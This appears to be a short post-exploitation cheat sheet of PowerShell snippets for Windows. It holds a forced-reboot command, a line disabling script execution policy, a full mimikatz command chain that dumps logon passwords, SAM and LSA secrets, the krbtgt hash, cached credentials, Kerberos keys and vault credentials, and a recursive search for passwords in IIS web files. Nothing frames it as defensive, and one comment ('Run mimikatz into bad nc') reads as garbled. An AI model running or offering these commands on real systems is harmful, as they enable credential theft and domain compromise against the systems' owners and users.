```powershell
shutdown /r /t 0
```

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted # Disable script restrictions
```

```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords full" "lsadump::sam" "lsadump::lsa /patch" "lsadump::lsa /inject" "lsadump::lsa /inject /name:krbtgt" "lsadump::cache" "sekurlsa::ekeys" "vault::cred /patch" exit # Run mimikatz into bad nc
```

```powershell
findstr /s /i /n "password" C:\inetpub\*.*
```